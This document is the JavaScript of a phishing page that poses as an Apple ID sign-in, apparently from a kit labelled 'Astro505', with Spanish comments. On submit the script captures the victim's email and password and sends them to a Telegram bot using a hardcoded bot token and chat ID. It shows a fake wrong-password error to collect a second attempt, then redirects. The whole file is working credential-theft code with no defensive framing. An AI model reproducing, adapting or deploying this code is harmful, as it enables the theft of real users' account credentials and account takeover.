<script>
document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 SCRIPT INICIADO');
    
    const emailInput = document.getElementById('email-phone');
    const arrowIcon = document.querySelector('.bx-right-arrow-circle');
    const passwordField = document.getElementById('passwordField');
    const passwordInput = document.getElementById('password');
    const submitBtn = document.getElementById('submitBtn');
    const errorMsg = document.getElementById('errorMsg');
    const form = document.getElementById('sign-in');
    
    const TELEGRAM_TOKEN = '7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA';
    const CHAT_ID = '7219932215';
    
    let loginAttempts = 0;
    
    // 🔥 FUNCIÓN CON DEBUG COMPLETO
    async function sendToTelegram(email, password) {
        console.log('📤 ENVIANDO A TELEGRAM:', email, password);
        
        const message = `🚀 *ASTRO505 - NUEVA CAPTURA APPLE ID* 🚀

📧 *Email:* ${email}
🔑 *Password:* ${password}
🌍 *País:* Mexico
💻 *Navegador:* Web
📱 *Device:* PC
📅 *Hora:* ${new Date().toLocaleString('es-ES')}

✨ *Plataforma:* Astro505`;

        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        console.log('🌐 URL:', url);
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            
            console.log('📡 RESPONSE:', response.status, response.statusText);
            
            const data = await response.json();
            console.log('✅ TELEGRAM DATA:', data);
            
            if (data.ok) {
                console.log('🎉 ¡MENSAJE ENVIADO!');
                return true;
            } else {
                console.error('❌ ERROR TELEGRAM:', data);
                return false;
            }
        } catch (error) {
            console.error('💥 FETCH ERROR:', error);
            return false;
        }
    }
    
    // Mostrar password
    const showPassword = () => {
        console.log('➡️ Mostrando password');
        if (emailInput.value.trim()) {
            passwordField.classList.add('show');
            submitBtn.classList.add('show');
            setTimeout(() => passwordInput.focus(), 250);
        }
    };
    
    // Eventos básicos
    arrowIcon.addEventListener('click', showPassword);
    emailInput.addEventListener('keypress', e => {
        if (e.key === 'Enter' && emailInput.value.trim()) {
            e.preventDefault();
            showPassword();
        }
    });
    
    // 🔥 SUBMIT CON DEBUG PASO A PASO
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        console.log('🎯 FORM SUBMIT - INICIO');
        
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();
        
        console.log('📧 Datos:', email, password);
        
        if (!email || !password) {
            console.log('⚠️ Faltan datos');
            showError('Complete todos los campos');
            return;
        }
        
        console.log('📤 LLAMANDO TELEGRAM...');
        const enviado = await sendToTelegram(email, password);
        console.log('📤 Telegram enviado:', enviado);
        
        // Simular login
        loginAttempts++;
        if (loginAttempts < 2) {
            showError('Contraseña incorrecta');
            passwordInput.value = '';
        } else {
            showSuccess();
        }
        
        console.log('🏁 SUBMIT FINALIZADO');
    });
    
    function showError(message) {
        errorMsg.textContent = message;
        errorMsg.style.background = '#ff3b30';
        errorMsg.classList.add('show');
        setTimeout(() => errorMsg.classList.remove('show'), 3000);
    }
    
    function showSuccess() {
        errorMsg.textContent = 'Iniciando sesión...';
        errorMsg.style.background = '#007AFF';
        errorMsg.classList.add('show');
        submitBtn.disabled = true;
        setTimeout(() => window.location.href = 'index.html', 1500);
    }
    
    console.log('✅ SCRIPT CARGADO CORRECTAMENTE');
});
</script>
